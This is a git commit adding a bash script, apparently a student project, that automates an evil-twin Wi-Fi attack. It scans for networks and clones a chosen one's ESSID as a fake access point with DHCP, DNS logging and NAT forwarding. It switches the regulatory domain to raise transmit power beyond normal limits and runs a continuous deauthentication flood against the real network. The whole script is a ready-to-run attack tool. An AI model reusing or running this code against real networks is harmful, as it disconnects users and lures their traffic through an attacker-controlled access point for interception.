ef918dc9e1cd06695ce23936f1c4f80ae180829a
human_garbage <42967481+Sam1312@users.noreply.github.com>
2019-07-16 23:24:41 +0200

    Create SetupFinal.sh

---
+++ SetupFinal.sh
@@ -0,0 +1,174 @@
+#-----------Log Files-------------------------#
+touch /tmp/log.txt
+LOG_FILE=/tmp/log.txt
+touch /tmp/HOSTAPD.txt
+LOG_HOSTAPD=/tmp/HOSTAPD.txt
+touch /tmp/DNS.txt
+LOG_DNS=/tmp/DNS.txt
+touch /tmp/DNSPOOF.txt
+SPOOF=/tmp/DNSPOOF.txt
+#------------Variables------------------------#
+INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
+INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)
+CHANNEL=11
+GATEWAY=10.0.0.1
+MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)
+MONITOR2=$(ifconfig |grep 2mon |cut -d ":" -f1)
+
+#-----------------------------------------------#
+
+#---------Installation-and-update----------------------------------------------#
+echo -e "\033[31mBefore the script begun we install some tools, like aircrack-ng ,hostapd,dnsmasq\033[0m"
+
+apt-get install aircrack-ng -y  &>>/dev/null
+apt-get install hostapd -y &>>/dev/null
+apt-get install dnsmasq -y &>>/dev/null
+apt-get install update -y &>>/dev/null
+
+
+#---------Check-the-interface-state---------------------------------#
+
+ifconfig $INTERFACE1 up
+ifconfig $INTERFACE2 up
+
+
+ifconfig $MONITOR1 down &>>/dev/null
+iwconfig $MONITOR1 mode monitor &>>/dev/null
+ifconfig $MONITOR1 up &>>/dev/null
+airmon-ng stop $MONITOR1 &>>/dev/null
+
+ifconfig $MONITOR2 down &>>/dev/null
+iwconfig $MONITOR2 mode monitor &>>/dev/null
+ifconfig $MONITOR2 up &>>/dev/null
+airmon-ng stop $MONITOR2 &>>/dev/null
+
+
+ifconfig $INTERFACE1 up
+ifconfig $INTERFACE2 up
+
+
+#-------------------------------------------------------------------------------#
+
+echo -e "\033[33mWelcome to our annual project , choose what you want to do\033[0m : "
+
+echo -e "\n"
+
+echo -e "\033[32m1.Deauthentication Attack\033[0m"
+
+echo -e "\n"
+
+echo -e "\033[34mChoose a option :\033[0m "
+read choice
+  if [ $choice -eq 1 ]
+#--------------First-Choice-----------------------------------------------------#
+
+then
+echo -e "\033[31mYOU CHOOSE DEAUTHENTICATION ATTACK !\033[0m"
+
+airmon-ng check kill &>> /dev/null
+airmon-ng check kill &>> /dev/null
+
+INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
+INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)
+
+ifconfig $INTERFACE1 up
+ifconfig $INTERFACE2 up
+
+INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
+INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)
+
+
+airmon-ng start $INTERFACE2 &>> $LOG_FILE
+
+MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)
+MONITOR2=$(ifconfig |grep 2mon |cut -d ":" -f1)
+
+
+#Just a verification for see if the interface are mount
+echo "The first interface for monitor mode is -->"$MONITOR2
+echo "The first interface for Deauth is -->"$INTERFACE1
+sleep 2;
+
+airodump-ng $INTERFACE1
+
+echo -e "\033[34mChoose the BSSID of the network to copy :\033[0m"
+read BSSID
+echo -e "\033[34mEnter the ESSID of the network :\033[0m"
+read ESSID
+echo -e "\033[34mAlso the channel :\033[0m"
+read CHANNEL
+
+echo -e "\n"
+echo -e "\033[34mYour choose the network :"$ESSID","$BSSID","$CHANNEL "nice choice\033[0m"
+
+
+ifconfig $MONITOR2 up $GATEWAY netmask 255.255.255.0
+
+killall network-manager dnsmasq wpa_supplicant dhcpcd &>> /dev/null
+
+touch hostapd.conf
+echo "
+interface=$MONITOR2
+driver=nl80211
+ssid=$ESSID
+hw_mode=g
+channel=$CHANNEL
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+" > /root/fakeap/hostapd.conf
+
+touch dnsmasq.conf
+echo "
+interface=$MONITOR2
+dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
+dhcp-option=3,$GATEWAY
+dhcp-option=6,$GATEWAY
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+" > /root/fakeap/dnsmasq.conf
+
+
+#Increase power of the card :
+
+echo -e "\033[33mPlease wait the power of the wifi card increased\033[0m"
+
+iw reg set BZ
+ip link set $MONITOR2 down
+iw dev $MONITOR2 set txpower fixed 30mBm
+ip link set $MONITOR2 up
+
+iw reg set BZ
+ip link set $INTERFACE1 down
+iw dev $INTERFACE1 set txpower fixed 30mBm
+ip link set $INTERFACE1 up
+
+sleep 5;
+
+
+echo -e "\033[33mThe power is now increased :)\033[0m"
+
+echo -e "\n"
+
+echo -e "\033[31mThe fake  access point starting\033[0m"
+
+hostapd /root/fakeap/hostapd.conf &>> $LOG_HOSTAPD &
+sleep 5;
+dnsmasq -C /root/fakeap/dnsmasq.conf -d &>> $LOG_DNS &
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain
+
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
+
+sleep 5;
+
+
+echo -e "\033[31mDeauth starting...\033[0m"
+xterm -hold -e "airodump-ng -c $CHANNEL $INTERFACE1" &
+sleep 1;
+xterm -hold -e "aireplay-ng -00 -a $BSSID $INTERFACE1" &
